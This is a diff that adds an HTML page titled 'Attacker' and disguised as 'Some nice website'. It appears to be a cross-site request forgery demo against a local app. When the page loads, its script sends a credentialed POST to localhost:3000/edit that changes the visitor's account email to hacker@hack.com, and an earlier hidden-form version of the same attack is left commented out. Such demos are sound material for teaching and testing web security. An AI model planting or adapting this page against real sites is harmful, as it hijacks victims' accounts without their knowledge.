@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Attacker</title>
+</head>
+<body>  
+    <div>
+        <h1>Some nice website</h1>
+    </div>
+    <!-- <form id="form" action="http://localhost:3000/edit" method="post"> -->
+        <!-- <input type="hidden" name="email" value="hacker@hack.com"/>
+    </form> -->
+</body>
+<script>
+    // const form = document.getElementById("form");
+    // form.submit();
+    fetch('http://localhost:3000/edit', { 
+        method: 'POST',
+        credentials: 'include',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        body: 'email=hacker@hack.com',
+    })
+    .then(res => console.log(res.status()))
+    .catch(err => console.log(err));
+</script>
+</html>
